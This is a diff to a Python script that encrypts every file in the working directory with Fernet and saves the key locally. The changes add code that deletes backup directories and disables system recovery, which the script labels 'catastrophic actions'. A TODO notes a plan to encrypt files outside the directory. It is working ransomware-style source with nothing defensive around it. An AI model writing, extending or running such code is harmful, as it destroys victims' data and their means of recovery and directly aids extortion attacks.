@@ -1,6 +1,8 @@
 #!/usr/bin/env python3
 
 import os
+import shutil
+import subprocess
 from cryptography.fernet import Fernet
 
 # Function to find all files in a directory
@@ -28,7 +30,7 @@ key = Fernet.generate_key()
 with open("thekey.key", "wb") as thekey:
     thekey.write(key)
 
-# Encrypting all the files
+# Encrypting all the files in cwd
 for file in files:
     try:
         with open(file, "rb") as thefile:
@@ -41,6 +43,39 @@ for file in files:
         print(f"Skipping file {file} due to {e}")
 
 print("Encryption process completed.")
+
+# Remove system backups and disable recovery options (DANGEROUS)
+def remove_backups():
+    backup_paths = [
+        "/var/backups",
+        "/mnt/backup",
+        "/etc/backups",
+        # Add more paths as necessary
+    ]
+    for path in backup_paths:
+        try:
+            shutil.rmtree(path)
+            print(f"Removed backup at {path}")
+        except Exception as e:
+            print(f"Could not remove backup at {path} due to {e}")
+
+def disable_recovery():
+    try:
+        # Disable system recovery (specific to certain systems)
+        subprocess.run(["systemctl", "disable", "--now", "recovery"], check=True)
+        print("Disabled system recovery")
+    except Exception as e:
+        print(f"Could not disable system recovery due to {e}")
+
+# Execute catastrophic actions
+remove_backups()
+disable_recovery()
+
+print("Catastrophic actions completed.")
+
+
+
+#TODO: encrypt all files outside of directory
 
 
 
